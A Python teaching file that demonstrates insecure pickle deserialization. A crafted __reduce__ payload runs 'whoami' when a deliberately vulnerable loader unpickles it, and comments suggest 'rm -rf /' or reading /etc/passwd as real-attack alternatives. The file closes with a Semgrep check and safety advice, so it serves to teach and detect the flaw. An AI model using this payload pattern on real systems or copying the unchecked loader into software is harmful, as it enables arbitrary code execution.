# insecure_deserialization.py
import pickle
import os
import subprocess # For a safer RCE demonstration

# This is a crafted pickle payload that, when loaded, will attempt to run a command.
# It creates a simple object whose __reduce__ method is malicious.
class Exploit:
    def __reduce__(self):
        # For demonstration, we'll use a relatively harmless command.
        # In a real attack, this could be 'rm -rf /' or something that downloads malware.
        cmd = ('whoami',) # Example: ('ls', '-l') or ('cat', '/etc/passwd') - be careful!
        # return (os.system, (cmd,)) # os.system is one way
        return (subprocess.check_output, (cmd,)) # subprocess is another

# Create an instance of our exploit class
malicious_object = Exploit()

# Simulate writing malicious data to a file
# This is the data that an attacker might provide
try:
    with open("data.pkl", "wb") as f:
        pickle.dump(malicious_object, f)
except Exception as e:
    print(f"Error creating malicious pickle file: {e}")
    exit()

# Vulnerable code: loading data from the file without validation or from an untrusted source
def load_data_from_file(filename):
    print(f"Attempting to load potentially malicious data from '{filename}'...")
    try:
        with open(filename, "rb") as f:
            # The vulnerability occurs here: deserializing untrusted data
            data = pickle.load(f)
        return data
    except pickle.UnpicklingError as e:
        print(f"Pickle error: {e}")
        return None
    except Exception as e:
        print(f"An unexpected error occurred during deserialization: {e}")
        return None

if __name__ == "__main__":
    print("--- Insecure Deserialization Demo with Python Pickle ---")

    # Demonstrate loading the malicious pickle
    loaded_object_result = load_data_from_file("data.pkl")

    if loaded_object_result is not None:
        print("\nDeserialization was successful (but dangerous!).")
        # If the payload was os.system, the command would have executed and returned an exit code.
        # If it was subprocess.check_output, the output of the command is returned.
        print("Result of command execution (if any):")
        try:
            # The result itself is the output of check_output
            print(loaded_object_result.decode().strip())
        except AttributeError:
            # If os.system was used, result is an int (exit code)
            print(f"Command exit code: {loaded_object_result}")
        except Exception as e:
            print(f"Could not decode result: {e}")


    print("\n--- Cleanup ---")
    # Clean up the created file
    if os.path.exists("data.pkl"):
        try:
            os.remove("data.pkl")
            print("Cleaned up data.pkl")
        except OSError as e:
            print(f"Error removing data.pkl: {e}")

    print("\nNote: Semgrep should flag the use of `pickle.load()`.")
    print("Run: semgrep --config \"p/python.security\" insecure_deserialization.py")

# Security Note:
# `pickle` is not secure against erroneous or maliciously constructed data.
# Never unpickle data received from an untrusted or unauthenticated source.
# Consider using safer formats like JSON for data interchange if you don't need to serialize complex Python objects,
# or use `hickle` which is a HDF5 based version of pickle, or other more secure serialization libraries
# if you must deserialize data from untrusted sources.
# For trusted data, ensure integrity by signing the data before pickling.
